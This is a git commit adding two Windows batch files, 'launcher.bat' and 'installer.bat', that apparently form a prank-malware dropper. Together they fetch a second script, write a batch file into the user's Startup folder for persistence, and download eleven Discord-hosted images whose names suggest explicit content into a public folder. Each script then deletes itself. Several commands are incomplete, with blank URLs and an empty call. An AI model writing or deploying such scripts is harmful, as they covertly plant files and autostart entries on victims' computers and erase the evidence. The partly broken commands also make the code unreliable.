7d9b7c0758691ebadc574d6b2f9d2f5b74af85af
Kawaiifoxxo <98438213+Kawaiifoxxo@users.noreply.github.com>
2022-01-27 19:39:11 -0500

    Add files via upload

---
+++ installer.bat
@@ -0,0 +1,17 @@
+del
+curl  --output "C:\Users\Jack\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\furry.start.bat"
+
+curl https://cdn.discordapp.com/attachments/935031778152960070/936052229385912330/StraightFurry_-_2o.png --output "C:\Users\Public\Documents\foxxo\1.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936052228295389224/StraightFurry_-_2k.png --output "C:\Users\Public\Documents\foxxo\2.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051421806202960/GayFurry_-_1o.png --output "C:\Users\Public\Documents\foxxo\3.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051421495828561/GayFurry_-_1n.png --output "C:\Users\Public\Documents\foxxo\4.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051420443082762/GayFurry_-_1k.png --output "C:\Users\Public\Documents\foxxo\5.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051374200873030/GayFurry_-_1y.png --output "C:\Users\Public\Documents\foxxo\6.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051374620291092/GayFurry_-_1z.png --output "C:\Users\Public\Documents\foxxo\7.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051970224042024/StraightFurry_-_2t.png --output "C:\Users\Public\Documents\foxxo\8.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051970442149948/StraightFurry_-_2u.png --output "C:\Users\Public\Documents\foxxo\9.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051970731561000/StraightFurry_-_2v.png --output "C:\Users\Public\Documents\foxxo\10.png"
+curl https://cdn.discordapp.com/attachments/935031778152960070/936051971243270204/StraightFurry_-_2x.png --output "C:\Users\Public\Documents\foxxo\11.png"
+
+call 
+del "./installer.bat"
---
+++ launcher.bat
@@ -0,0 +1,4 @@
+mkdir C:\Users\Public\Documents\foxxo\
+curl  --output "C:\Users\Public\Documents\foxxo\installer.bat"
+call "C:\Users\Public\Documents\foxxo\installer.bat"
+del "./launcher.bat"
